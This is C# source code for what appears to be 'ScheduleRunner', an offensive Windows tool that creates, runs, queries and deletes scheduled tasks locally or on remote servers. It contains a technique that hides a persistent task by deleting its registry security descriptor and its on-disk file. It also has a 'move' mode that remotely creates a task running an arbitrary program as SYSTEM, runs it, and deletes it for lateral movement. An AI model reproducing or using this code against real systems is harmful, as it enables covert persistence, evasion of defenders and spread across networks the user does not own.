using Microsoft.Win32;

using Microsoft.Win32.TaskScheduler;

using System;

using System.IO;

using System.Linq;

using System.Runtime.InteropServices;

using System.Security;

using System.Security.Principal;


namespace ScheduleRunner

{

    class TaskManager

    {

        // API used to avoid redirecting to SYSWOW64 folder

        [DllImport("kernel32.dll", SetLastError = true)]

        public static extern int Wow64DisableWow64FsRedirection(ref IntPtr ptr);


        public TaskManager(string method, string taskName, string folder, string workingDirectory, string author, string description, string trigger, string program, string argument, string user, string modifier, string startTime, string remoteServer, bool hide)

        {

            Helper.Banner();

            try

            {

                method = method.ToLower();

                switch (method)

                {

                    case "create":

                        CreateScheduledTask(taskName, folder, workingDirectory, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, hide);

                        break;

                    case "delete":

                        RemoveScheduledTask(taskName, folder, remoteServer, null, hide);

                        break;

                    case "run":

                        RunScheduledTask(taskName, folder, remoteServer, null);

                        break;

                    case "query":

                        ListScheduledTasks(taskName, folder, remoteServer);

                        break;

                    case "queryfolders":

                        ListAllFolders(remoteServer);

                        break;

                    case "move":

                        LateralMovement(taskName, folder, workingDirectory, author, description, trigger, program, argument, user, modifier, startTime, remoteServer);

                        break;

                    default:

                        Console.WriteLine("[-] Error: Unknown method.");

                        break;

                }

            }

            catch (Exception)

            {

                Console.WriteLine("[-] Error: Unknown method.");

            }

        }


        // Check if current user is "NT AUTHORITY\SYSTEM"

        private bool CheckIsSystem()

        {

            string currentUser  = WindowsIdentity.GetCurrent().Name;

            return currentUser  == @"NT AUTHORITY\SYSTEM";

        }


        // Technique - hiding scheduled task

        private void HideScheduledTask(string taskName)

        {

            Console.WriteLine("[+] Executing technique - hiding scheduled task...");

            string treeKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\";


            // Avoid redirecting to syswow64

            IntPtr val = IntPtr.Zero;

            Wow64DisableWow64FsRedirection(ref val);


            try

            {

                Console.WriteLine($"[+] Removing 'SD' value from '{treeKey}{taskName}'...");

                using (var key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)

                    .OpenSubKey(treeKey + taskName, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.WriteKey))

                {

                    key.DeleteValue("SD");

                }

            }

            catch (UnauthorizedAccessException)

            {

                Console.WriteLine("[-] Error: You do not have sufficient permission to hide the scheduled task.");

                return;

            }

            catch (Exception)

            {

                Console.WriteLine("[-] Error: Error when hiding the scheduled task.");

                return;

            }


            string pathToDelete = Path.Combine(@"C:\Windows\System32\Tasks", taskName);

            try

            {

                Console.WriteLine($"[+] Removing scheduled task on disk artifact - '{pathToDelete}'...");

                File.Delete(pathToDelete);

            }

            catch (IOException)

            {

                Console.WriteLine($"[-] Error: The '{pathToDelete}' file is in use by another process.");

            }

            catch (DirectoryNotFoundException)

            {

                Console.WriteLine($"[-] Error: The path '{pathToDelete}' is invalid.");

            }

            catch (Exception)

            {

                Console.WriteLine($"[-] Error: Unknown error while deleting the scheduled task on-disk artifact - '{pathToDelete}'.");

            }


            Console.WriteLine("[+] The scheduled task is hidden and invisible now.");

        }


        // Delete hidden scheduled task

        private void RemoveHiddenScheduledTask(string taskName)

        {

            string treeKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\";

            string taskKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\";


            // Avoid redirecting to syswow64

            IntPtr val = IntPtr.Zero;

            Wow64DisableWow64FsRedirection(ref val);


            try

            {

                using (var treeSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)

                    .OpenSubKey(treeKey + taskName, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey))

                {

                    if (treeSubKey == null)

                    {

                        Console.WriteLine("[-] Error: The scheduled task does not exist.");

                        return;

                    }


                    Console.WriteLine($"[+] Deleting the scheduled task: {taskName}...");

                    object id = treeSubKey.GetValue("Id");

                    using (var taskSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)

                        .OpenSubKey(taskKey + id, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey))

                    {

                        if (taskSubKey != null)

                            RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).DeleteSubKeyTree(taskKey + id);

                    }

                    RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).DeleteSubKeyTree(treeKey + taskName);

                }

            }

            catch (UnauthorizedAccessException)

            {

                Console.WriteLine("[-] Error: You do not have sufficient permission to remove the scheduled task.");

                return;

            }

            catch (Exception)

            {

                Console.WriteLine("[-] Error: Unknown error while deleting the scheduled task.");

                return;

            }


            string pathToDelete = Path.Combine(@"C:\Windows\System32\Tasks", taskName);

            try

            {

                Console.WriteLine($"[+] Removing scheduled task on disk artifact - '{pathToDelete}'...");

                File.Delete(pathToDelete);

            }

            catch (IOException)

            {

                Console.WriteLine($"[-] Error: The '{pathToDelete}' file is in use by another process.");

            }

            catch (DirectoryNotFoundException)

            {

                Console.WriteLine($"[-] Error: The path '{pathToDelete}' is invalid.");

            }

            catch (Exception)

            {

                Console.WriteLine($"[-] Error: Unknown error while deleting the scheduled task on-disk artifact - '{pathToDelete}'.");

            }


            Console.WriteLine("[+] The scheduled task is deleted. However, the deleted scheduled task would continue to run according to the defined triggers until the system rebooted.");

        }


        // Validate the scheduled task is using 'hide' technique before deletion

        private bool CheckIsHiddenScheduledTask(string taskName)

        {

            string treeKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\";

            object sd;


            try

            {

                using (var treeSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)

                    .OpenSubKey(treeKey + taskName, RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.ReadKey))

                {

                    if (treeSubKey == null)

                    {

                        Console.WriteLine("[-] Error: The scheduled task does not exist.");

                        return false;

                    }


                    sd = treeSubKey.GetValue("SD");


                    if (sd == null)

                        return true;

                    else

                    {

                        Console.WriteLine("[-] Error: Your task is not using hidden scheduled task technique. You should remove '/technique:hide' to properly delete the task.");

                        return false;

                    }

                }

            }

            catch (UnauthorizedAccessException)

            {

                Console.WriteLine("[-] Error: You do not have sufficient permission to validate the existence of the scheduled task in registry.");

                return false;

            }

            catch (Exception)

            {

                Console.WriteLine("[-] Error: Unknown error while checking the scheduled task via registry.");

                return false;

            }

        }


        private TaskService CreateScheduledTask(string taskName, string folder, string workingDirectory, string author, string description, string trigger, string program, string argument, string user, string modifier, string startTime, string remoteServer, bool hide)

        {

            try

            {

                // Check key parameters

                if (string.IsNullOrEmpty(taskName) || string.IsNullOrEmpty(trigger) || string.IsNullOrEmpty(program))

                {

                    Console.WriteLine("[-] Error: Missing parameters. \"/taskname, /program, /trigger\" must be defined. Please try again.");

                    return null;

                }


                // Check technique - hiding scheduled task

                if (hide)

                {

                    if (remoteServer != null)

                    {

                        Console.WriteLine("[-] Error: Technique (hiding scheduled task) does not support remote server since 'Remote Registry' service is ran by Local Service only.");

                        return null;

                    }

                    else if (!CheckIsSystem())

                    {

                        Console.WriteLine("[-] Error: Using technique (hiding scheduled task) requires NT AUTHORITY\\SYSTEM.");

                        return null;

                    }

                }


                TaskService ts;


                // Validate remote access

                if (remoteServer != null)

                {

                    ts = GetRemoteTaskService(remoteServer);

                    if (ts == null)

                        return null;

                    if (user == null)

                        user = "NT AUTHORITY\\SYSTEM";

                }

                else

                {

                    ts = new TaskService();

                    if (ts == null)

                        return null;

                    if (user == null)

                        user = WindowsIdentity.GetCurrent().Name;

                }


                // Check if the folder exists

                if (!string.IsNullOrEmpty(folder))

                {

                    if (folder.EndsWith("\\"))

                    {

                        if (!CheckIfFolderExists(ts, folder.Remove(folder.Length - 1)))

                        {

                            Console.WriteLine("[-] Error: The folder does not exist.");

                            return null;

                        }

                    }

                    else

                    {

                        if (!CheckIfFolderExists(ts, folder))

                        {

                            Console.WriteLine("[-] Error: The folder does not exist.");

                            return null;

                        }

                        folder += "\\";

                    }

                    taskName = folder + taskName;

                }


                TaskDefinition td = ts.NewTask();


                // Define trigger

                if (trigger.Equals("weekly", StringComparison.OrdinalIgnoreCase))

                {

                    if (string.IsNullOrEmpty(startTime))

                    {

                        Console.WriteLine("[-] Error: The starttime is not defined. Please try again. For example, \"/starttime:23:30\" to repeat the task daily at 11:30pm.");

                        return null;

                    }

                    if (string.IsNullOrEmpty(modifier))

                    {

                        Console.WriteLine("[-] Error: The modifier is not defined. Please try again. For example, use \"/modifier:mon,sat,sun\" to repeat the task every Monday, Saturday and Sunday.");

                        return null;

                    }

                    try

                    {

                        var daysofweekmodifier = modifier.Split(',').Select(day => day.ToLower()).ToList();

                        DaysOfTheWeek daysofweek = 0;

                        foreach (var day in daysofweekmodifier)

                        {

                            daysofweek |= day switch

                            {

                                "mon" or "monday" => DaysOfTheWeek.Monday,

                                "tue" or "tuesday" or "tues" => DaysOfTheWeek.Tuesday,

                                "wed" or "wednesday" => DaysOfTheWeek.Wednesday,

                                "thu" or "thursday" or "thur" or "thurs" => DaysOfTheWeek.Thursday,

                                "fri" or "friday" => DaysOfTheWeek.Friday,

                                "sat" or "saturday" => DaysOfTheWeek.Saturday,

                                "sun" or "sunday" => DaysOfTheWeek.Sunday,

                                _ => 0

                            };

                        }

                        if (daysofweek == 0)

                        {

                            Console.WriteLine("[-] Error: The format of the \"/modifier:\" parameter is incorrect. Please try again. For example, use \"/modifier:mon,sat,sun\" to repeat the task every Monday, Saturday and Sunday.");

                            return null;

                        }

                        var (hour, minute) = ParseStartTime(startTime);

                        WeeklyTrigger dt = new WeeklyTrigger

                        {

                            StartBoundary = DateTime.Today + TimeSpan.FromHours(hour) + TimeSpan.FromMinutes(minute),

                            DaysOfWeek = daysofweek

                        };

                        td.Triggers.Add(dt);

                    }

                    catch (FormatException)

                    {

                        Console.WriteLine("[-] Error: Wrong time format for \"/starttime:\" or \"/modifier:\". Please try again. For example, use \"/starttime:23:30\" \"/modifier:mon,sat,sun to repeat the task every Monday, Saturday, and Sunday at 11:30pm.");

                        return null;

                    }

                }

                else if (trigger.Equals("daily", StringComparison.OrdinalIgnoreCase))

                {

                    if (string.IsNullOrEmpty(startTime))

                    {

                        Console.WriteLine("[-] Error: The starttime is not defined. Please try again. For example, \"/starttime:23:30\" to repeat the task daily at 11:30pm.");

                        return null;

                    }

                    try

                    {

                        var (hour, minute) = ParseStartTime(startTime);

                        DailyTrigger dt = new DailyTrigger

                        {

                            StartBoundary = DateTime.Today + TimeSpan.FromHours(hour) + TimeSpan.FromMinutes(minute),

                            DaysInterval = 1

                        };

                        td.Triggers.Add(dt);

                    }

                    catch (FormatException)

                    {

                        Console.WriteLine("[-] Error: Wrong time format for \"/starttime:\". Please try again. For example, use \"/starttime:23:30\" to repeat the task daily at 11:30pm.");

                        return null;

                    }

                }

                else if (trigger.Equals("hourly", StringComparison.OrdinalIgnoreCase))

                {

                    TimeTrigger tt = new TimeTrigger();

                    if (string.IsNullOrEmpty(modifier))

                    {

                        Console.WriteLine("[-] Error: The modifier is not defined. Please try again. For example, use \"/modifier:4\" to repeat the task every 4 hours.");

                        return null;

                    }

                    if (int.TryParse(modifier, out int hours) && hours <= 23)

                    {

                        tt.Repetition.Interval = TimeSpan.FromHours(hours);

                    }

                    else

                    {

                        Console.WriteLine("[-] Error: The modifier for hourly trigger should be lower than 24 hours. Please try again.");

                        return null;

                    }

                    td.Triggers.Add(tt);

                }

                else if (trigger.Equals("minute", StringComparison.OrdinalIgnoreCase))

                {

                    TimeTrigger tt = new TimeTrigger();

                    if (string.IsNullOrEmpty(modifier))

                    {

                        Console.WriteLine("[-] Error: The modifier is not defined. Please try again. For example, use \"/modifier:60\" to repeat the task every 60 minutes.");

                        return null;

                    }

                    if (int.TryParse(modifier, out int minutes) && minutes <= 1439)

                    {

                        tt.Repetition.Interval = TimeSpan.FromMinutes(minutes);

                    }

                    else

                    {

                        Console.WriteLine("[-] Error: The modifier for minute trigger should be lower than 1439 minutes. Please try again.");

                        return null;

                    }

                    td.Triggers.Add(tt);

                }

                else if (trigger.Equals("onlogon", StringComparison.OrdinalIgnoreCase))

                {

                    LogonTrigger lt = new LogonTrigger { UserId = user };

                    td.Triggers.Add(lt);

                }

                else if (trigger.Equals("onstart", StringComparison.OrdinalIgnoreCase))

                {

                    BootTrigger bt = new BootTrigger();

                    td.Triggers.Add(bt);

                }

                else if (trigger.Equals("onidle", StringComparison.OrdinalIgnoreCase))

                {

                    IdleTrigger it = new IdleTrigger();

                    td.Triggers.Add(it);

                }

                else

                {

                    Console.WriteLine("[-] Error: No such schedule type. Please try again.");

                    return null;

                }


                // Add command line argument

                td.Actions.Add(program, argument, workingDirectory);


                // Setting for the scheduled task

                td.Settings.DisallowStartIfOnBatteries = false;

                td.Settings.StopIfGoingOnBatteries = false;

                td.Settings.StartWhenAvailable = true;

                td.Settings.Enabled = true;

                td.RegistrationInfo.Description = description;

                td.RegistrationInfo.Author = author;


                // Specific user who executes the scheduled task

                td.Principal.UserId = user;


                // Register the task in the root folder

                Console.WriteLine($"[+] Creating the scheduled task: {taskName}...");

                ts.RootFolder.RegisterTaskDefinition(taskName, td);


                // Check if the newly created scheduled task exists

                if (CheckIfScheduledTaskExists(ts, taskName))

                {

                    Console.WriteLine("[+] The scheduled task is created.");

                    if (hide)

                        HideScheduledTask(taskName);

                    return ts;

                }

                else

                {

                    Console.WriteLine("[-] Error: Unknown error. The scheduled task was not created.");

                    return null;

                }

            }

            catch (UnauthorizedAccessException)

            {

                Console.WriteLine("[-] Error: You do not have sufficient permission to create the scheduled task.");

                return null;

            }

            catch (COMException e)

            {

                Console.WriteLine(e.HResult switch

                {

                    0x800706B5 => "[-] Error: The interface is unknown. Probably the Schedule service is down?",

                    0x80070534 => "[-] Error: The user name could not be found.",

                    _ => $"[-] Error: {e.Message}"

                });

                return null;

            }

            catch (Exception)

            {

                Console.WriteLine("[-] Error: Error when creating the scheduled task. Please check your parameters again.");

                return null;

            }

        }


        private void RemoveScheduledTask(string taskName, string folder, string remoteServer, TaskService ts, bool hide)

        {

            // Check key parameters

            if (string.IsNullOrEmpty(taskName))

            {

                Console.WriteLine("[-] Error: Missing parameter. \"/taskname\" must be defined. Please try again.");

                return;

            }


            // Validate setup for removing hidden scheduled task

            if (hide)

            {

                if (remoteServer != null)

                {

                    Console.WriteLine("[-] Error: Technique (hiding scheduled task) does not support remote server since 'Remote Registry' service is ran by Local Service only.");

                    return;

                }

                else if (!CheckIsSystem())

                {

                    Console.WriteLine("[-] Error: Removing hidden scheduled task requires NT AUTHORITY\\SYSTEM.");

                    return;

                }

            }


            if (ts == null)

            {

                // Validate remote access

                if (remoteServer != null)

                {

                    ts = GetRemoteTaskService(remoteServer);

                    if (ts == null)

                        return;

                }

                else

                    ts = new TaskService();

            }


            // Check if the folder exists

            if (!string.IsNullOrEmpty(folder))

            {

                if (folder.EndsWith("\\"))

                {

                    if (!CheckIfFolderExists(ts, folder.Remove(folder.Length - 1)))

                    {

                        Console.WriteLine("[-] Error: The folder does not exist.");

                        return;

                    }

                }

                else

                {

                    if (!CheckIfFolderExists(ts, folder))

                    {

                        Console.WriteLine("[-] Error: The folder does not exist.");

                        return;

                    }

                    folder += "\\";

                }

                taskName = folder + taskName;

            }


            if (hide)

            {

                if (CheckIsHiddenScheduledTask(taskName))

                    RemoveHiddenScheduledTask(taskName);

            }

            else

            {

                // Check if the task exists

                if (CheckIfScheduledTaskExists(ts, taskName))

                {

                    try

                    {

                        // Start deleting the task

                        Console.WriteLine($"[+] Deleting the scheduled task: {taskName}...");

                        ts.RootFolder.DeleteTask(taskName);

                    }

                    catch (UnauthorizedAccessException)

                    {

                        Console.WriteLine("[-] Error: Access is denied.");

                        return;

                    }

                    catch (Exception)

                    {

                        Console.WriteLine("[-] Error: Unknown error while deleting the scheduled task.");

                        return;

                    }


                    if (!CheckIfScheduledTaskExists(ts, taskName))

                    {

                        Console.WriteLine("[+] The scheduled task is deleted.");

                    }

                    else

                    {

                        Console.WriteLine("[-] Error: The scheduled task cannot be deleted.");

                    }

                }

                else

                {

                    Console.WriteLine("[-] Error: The scheduled task does not exist.");

                }

            }

        }


        private void RunScheduledTask(string taskName, string folder, string remoteServer, TaskService ts)

        {

            // Check key parameters

            if (string.IsNullOrEmpty(taskName))

            {

                Console.WriteLine("[-] Error: Missing parameter. \"/taskname\" must be defined. Please try again.");

                return;

            }


            if (ts == null)

            {

                // Validate remote access

                if (remoteServer != null)

                {

                    ts = GetRemoteTaskService(remoteServer);

                    if (ts == null)

                        return;

                }

                else

                    ts = new TaskService();

            }


            // Check if the folder exists

            if (!string.IsNullOrEmpty(folder))

            {

                if (folder.EndsWith("\\"))

                {

                    if (!CheckIfFolderExists(ts, folder.Remove(folder.Length - 1)))

                    {

                        Console.WriteLine("[-] Error: The folder does not exist.");

                        return;

                    }

                }

                else

                {

                    if (!CheckIfFolderExists(ts, folder))

                    {

                        Console.WriteLine("[-] Error: The folder does not exist.");

                        return;

                    }

                    folder += "\\";

                }

                taskName = folder + taskName;

            }


            Task t = ts.GetTask(taskName);


            // Execute the task if exists

            if (t == null)

            {

                Console.WriteLine("[-] Error: The scheduled task does not exist.");

                return;

            }

            else

            {

                Console.WriteLine($"[+] Running the scheduled task: {taskName}...");

                try

                {

                    t.Run();

                    Console.WriteLine("[+] The scheduled task is started.");

                }

                catch (Exception)

                {

                    Console.WriteLine("[-] Error: The scheduled task cannot be started.");

                    return;

                }

            }

        }


        private void ListScheduledTasks(string taskName, string folder, string remoteServer)

        {

            if (!string.IsNullOrEmpty(taskName))

                ListDetailsForScheduledTask(taskName, folder, remoteServer);

            else

            {

                TaskService ts;

                if (remoteServer != null)

                {

                    ts = GetRemoteTaskService(remoteServer);

                    if (ts == null)

                        return;

                }

                else

                    ts = new TaskService();

                if (!string.IsNullOrEmpty(folder))

                {

                    if (folder.EndsWith("\\"))

                    {

                        folder = folder.Remove(folder.Length - 1);

                    }

                    ListScheduledTasksInFolder(ts.GetFolder(folder), remoteServer);

                }

                else

                    ListScheduledTasksInFolder(ts.RootFolder, remoteServer);

            }

        }


        private void ListDetailsForScheduledTask(string taskName, string folder, string remoteServer)

        {

            TaskService ts;


            // Validate remote access

            if (remoteServer != null)

            {

                ts = GetRemoteTaskService(remoteServer);

                if (ts == null)

                    return;

            }

            else

                ts = new TaskService();


            // Check if the folder exists

            if (!string.IsNullOrEmpty(folder))

            {

                if (folder.EndsWith("\\"))

                {

                    if (!CheckIfFolderExists(ts, folder.Remove(folder.Length - 1)))

                    {

                        Console.WriteLine("[-] Error: The folder does not exist.");

                        return;

                    }

                }

                else

                {

                    if (!CheckIfFolderExists(ts, folder))

                    {

                        Console.WriteLine("[-] Error: The folder does not exist.");

                        return;

                    }

                    folder += "\\";

                }

                taskName = folder + taskName;

            }


            if (!CheckIfScheduledTaskExists(ts, taskName))

            {

                Console.WriteLine("[-] Error: The scheduled task does not exist.");

                return;

            }

            else

            {

                Task t = ts.GetTask(taskName);

                Console.WriteLine($"Task name: {t.Name}");

                Console.WriteLine($"Task folder: {t.Folder}");

                Console.WriteLine($"Task full path: {t.Path}");

                Console.WriteLine($"Task state: {t.State}");

                Console.WriteLine($"Task enabled: {t.Enabled}");

                Console.WriteLine($"Task last run time: {t.LastRunTime}");

                Console.WriteLine($"Task next run time: {t.NextRunTime}");

                Console.WriteLine($"Task XML: \n{t.Xml}");

            }

        }


        private void ListScheduledTasksInFolder(TaskFolder fld, string remoteServer)

        {

            if (fld == null)

            {

                Console.WriteLine("[-] Error: This folder cannot be found.");

                return;

            }

            Console.WriteLine($"[+] Current folder: {fld}");


            Console.WriteLine("[+] Getting sub folders...");


            foreach (TaskFolder tf in fld.SubFolders)

            {

                Console.WriteLine("----------------------------------------------------------------------");

                Console.WriteLine($"Sub folder name: {tf.Path}");

                string argumentForRemoteServer = remoteServer != null ? $" /remoteserver:{remoteServer}" : string.Empty;

                Console.WriteLine($"Command to check for sub folder details: ScheduleRunner.exe /method:query /folder:\"{tf.Path}\"{argumentForRemoteServer}");

            }

            Console.WriteLine("----------------------------------------------------------------------");

            Console.WriteLine($"[+] Number of sub folder(s): {fld.SubFolders.Count}");


            Console.WriteLine("\r\n\r\n[+] Getting tasks...");

            foreach (Task t in fld.Tasks)

            {

                Console.WriteLine("----------------------------------------------------------------------");

                Console.WriteLine($"Task name: {t.Name}");

                Console.WriteLine($"Task folder: {t.Folder}");

                Console.WriteLine($"Task full path: {t.Path}");

                string argumentForRemoteServer = remoteServer != null ? $" /remoteserver:{remoteServer}" : string.Empty;

                Console.WriteLine(t.Folder.ToString() == "\\"

                    ? $"Command to check for task details: ScheduleRunner.exe /method:query /taskname:\"{t.Name}\"{argumentForRemoteServer}"

                    : $"Command to check for task details: ScheduleRunner.exe /method:query /taskname:\"{t.Name}\" /folder:\"{t.Folder}\"{argumentForRemoteServer}");

            }

            Console.WriteLine("----------------------------------------------------------------------");

            Console.WriteLine($"[+] Number of task(s): {fld.Tasks.Count}");

        }


        private void ListAllFolders(string remoteServer)

        {

            TaskService ts;

            if (remoteServer != null)

            {

                ts = GetRemoteTaskService(remoteServer);

                if (ts == null)

                    return;

            }

            else

                ts = new TaskService();

            Console.WriteLine("[+] Listing all folders.");

            Console.WriteLine("----------------------------------------------------------------------");

            ListSubFolders(ts.RootFolder);

        }


        private void ListSubFolders(TaskFolder fld)

        {

            foreach (TaskFolder sfld in fld.SubFolders)

            {

                Console.WriteLine(sfld.Path);

                ListSubFolders(sfld);

            }

        }


        private void LateralMovement(string taskName, string folder, string workingDirectory, string author, string description, string trigger, string program, string argument, string user, string modifier, string startTime, string remoteServer)

        {

            if (remoteServer == null || string.IsNullOrEmpty(taskName) || string.IsNullOrEmpty(program))

            {

                Console.WriteLine("[-] Error: Missing parameters. \"/remoteserver, /taskname, /program\" must be defined. Please try again.");

                return;

            }

            if (string.IsNullOrEmpty(trigger))

                trigger = "onlogon";

            TaskService ts = CreateScheduledTask(taskName, folder, workingDirectory, author, description, trigger, program, argument, user, modifier, startTime, remoteServer, false);

            if (ts != null)

            {

                RunScheduledTask(taskName, folder, remoteServer, ts);

                RemoveScheduledTask(taskName, folder, remoteServer, ts, false);

            }

        }


        private bool CheckIfScheduledTaskExists(TaskService ts, string taskName)

        {

            return ts.GetTask(taskName) != null;

        }


        private bool CheckIfFolderExists(TaskService ts, string folder)

        {

            return ts.GetFolder(folder) != null;

        }


        private TaskService GetRemoteTaskService(string remoteServer)

        {

            try

            {

                Console.WriteLine($"[+] Connecting to target server: {remoteServer}...");

                TaskService ts = new TaskService(remoteServer);

                Console.WriteLine($"[+] Connected to {remoteServer}.");

                return ts;

            }

            catch (FileNotFoundException)

            {

                Console.WriteLine("[-] Error: The network path was not found.");

                return null;

            }

            catch (UnauthorizedAccessException)

            {

                Console.WriteLine("[-] Error: Access is denied.");

                return null;

            }

            catch (Exception)

            {

                Console.WriteLine("[-] Error: Unknown error while accessing remote server.");

                return null;

            }

        }


        private (int hour, int minute) ParseStartTime(string startTime)

        {

            var timeParts = startTime.Split(':');

            return (int.Parse(timeParts[0]), int.Parse(timeParts[1]));

        }

    }

}
